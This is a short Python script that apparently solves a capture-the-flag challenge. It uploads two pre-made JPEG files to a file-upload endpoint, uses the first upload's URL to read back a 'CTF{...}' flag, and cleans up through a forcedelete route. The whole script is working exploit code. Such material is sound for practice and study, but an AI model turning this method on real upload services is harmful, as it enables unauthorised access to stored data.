import requests
import re
import sys
import hashlib

# this requires pre-made 0.jpeg, 1.jpeg


def getfid(filename):
    with open(filename, 'rb') as fp:
        return hashlib.sha256(fp.read()).hexdigest()


def main(endpoint):
    if endpoint[-1] != '/':
        endpoint += '/'
    print('Cleaning old files.')
    requests.get(endpoint + 'forcedelete/{}'.format(getfid('0.jpeg')))
    requests.get(endpoint + 'forcedelete/{}'.format(getfid('1.jpeg')))
    try:
        print('Uploading 0.jpeg')
        files = {'fileupload': open('0.jpeg', 'rb')}
        resp = requests.post(endpoint, files=files)
        resp.raise_for_status()
        read_url = resp.url
        print('Uploading 1.jpeg')
        files = {'fileupload': open('1.jpeg', 'rb')}
        resp = requests.post(endpoint, files=files)
        resp.raise_for_status()
        print('Retrieving flag')
        resp = requests.get(read_url)
        flag_match = re.search('CTF\{[^}]+\}', resp.text)
        if flag_match:
            print(flag_match.group(0))
        else:
            print('No flag found!!')
    finally:
        print('Cleaning up files.')
        requests.get(endpoint + 'forcedelete/{}'.format(getfid('0.jpeg')))
        requests.get(endpoint + 'forcedelete/{}'.format(getfid('1.jpeg')))



if __name__ == '__main__':
    main(sys.argv[1])
